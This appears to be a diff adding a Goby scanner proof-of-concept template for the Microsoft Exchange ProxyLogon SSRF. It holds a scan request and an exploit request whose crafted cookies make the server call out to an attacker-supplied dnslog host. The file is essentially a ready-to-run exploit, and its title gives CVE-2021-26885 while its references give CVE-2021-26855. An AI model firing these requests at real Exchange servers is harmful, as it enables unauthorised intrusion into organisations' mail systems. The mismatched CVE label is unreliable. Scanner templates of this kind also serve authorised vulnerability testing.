@@ -1,0 +1,104 @@
+{
+      "Name": "Microsoft Exchange Server SSRF CVE-2021-26885",
+      "Level": "3",
+      "Tags": [
+            "SSRF"
+      ],
+      "GobyQuery": "app=\"Microsoft-Exchange\" || title=\"Outlook\"",
+      "Description": "Work smarter with business-class email and calendaring.",
+      "Product": "Microsoft Exchange",
+      "Homepage": "https://www.microsoft.com/en-gb/microsoft-365/exchange/email",
+      "Author": "",
+      "Impact": "Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-26412, CVE-2021-26854, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065, CVE-2021-27078.",
+      "Recommendation": "Apply the appropriate security update.",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-26855",
+            "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-26855",
+            "https://proxylogon.com/#timeline",
+            "https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse",
+            "https://www.shodan.io/search?query=vuln%3ACVE-2021-26855",
+            "https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Dnslog",
+                  "Type": "input",
+                  "Value": "xxx.dnslog.cn"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/ecp/test.js",
+                        "follow_redirect": false,
+                        "header": {
+                              "Cookie": "X-BEResource=test/api/endpoint#~1; X-AnonResource=true"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "NegotiateSecurityContext",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/owa/auth/test.js",
+                        "follow_redirect": true,
+                        "header": {
+                              "Cookie": "X-AnonResource=true; X-AnonResource-Backend={{{Dnslog}}}/ecp/default.flt?~3; X-BEResource={{{Dnslog}}}/owa/auth/logon.aspx?~3;"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
